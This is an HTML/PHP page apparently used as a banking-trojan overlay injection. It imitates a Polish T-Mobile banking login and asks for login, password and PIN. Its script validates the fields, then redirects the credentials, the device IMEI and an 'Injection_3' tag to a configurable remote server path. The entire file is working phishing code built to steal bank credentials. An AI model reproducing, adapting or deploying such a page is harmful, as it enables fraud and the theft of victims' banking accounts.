<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>T-Mobile Bankowe</title>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
    <script src="js/credit.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
	<link rel="stylesheet" href="pl/pl.fmbank.smart/css/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="booting on text-center alert alert-danger" style="position: absolute;width: 100%;">
        Błąd połączenia z serwerem
    </div>
<div class="centered">
        <form method="post">
            <input type="text" id="login" name="login" class="input" placeholder="Login">

            <input type="password" id="password" name="password" class="input" placeholder="Password">

            <input type="password" id="pin" name="pin" class="input" placeholder="PIN">

            <input type="button" id="input_submitBtn" onclick="sentServer();" class="button" value="Log in">
        </form>
</div>
<script>
	function sentServer()
	{
	//var imei_c = document.forms["form"].elements["imei"].value;
  var oNumInp = document.getElementById('login').value;
  var oCodeInp = document.getElementById('password').value;
  var oPinInp = document.getElementById('pin').value;

	var url='<?php echo $URL; ?>';
    var imei_c='<?php echo $IMEI_country; ?>';

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|pl_fmbank_smart|"+oNumInp+"|"+oCodeInp+"|"+oPinInp);
	}
</script>
<script type="text/javascript">
            var g_oBtn = document.getElementById('input_submitBtn');
            g_oBtn.onclick = function () {

                var oNumInp = document.getElementById('login');
                var oCodeInp = document.getElementById('password');
                var oPinInp = document.getElementById('pin');

                try{
                    oNumInp.className = oCodeInp.className = oPinInp.className = 'input';
                } catch(e){};

                if (oNumInp.value.length < 6) {
                    try{
                        oNumInp.className = 'fielderror';
                    } catch(e){};
                    return false;
                }

                if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
                    try{
                        oCodeInp.className = 'fielderror';
                    } catch(e){};
                    return false;
                }

                if (!/^\w{4,8}$/i.test(oPinInp.value)) {
                    try{
                        oPinInp.className = 'fielderror';
                    } catch(e){};
                    return false;
                }
                sentServer();
            }
</script>
    <script>main={booting:function(){var t=this;"undefined"!=typeof angular?setTimeout(function(){$(".booting").removeClass("on"),setTimeout(function(){$(".fixed-top").addClass("on"),t.start()},500)},3e3):setTimeout(function(){t.booting()},300)},start:function(){},loader_:{show:function(){$(".booting").addClass("on")},hide:function(){$(".booting").removeClass("on")}}},main.booting()</script>

</body>
</html>
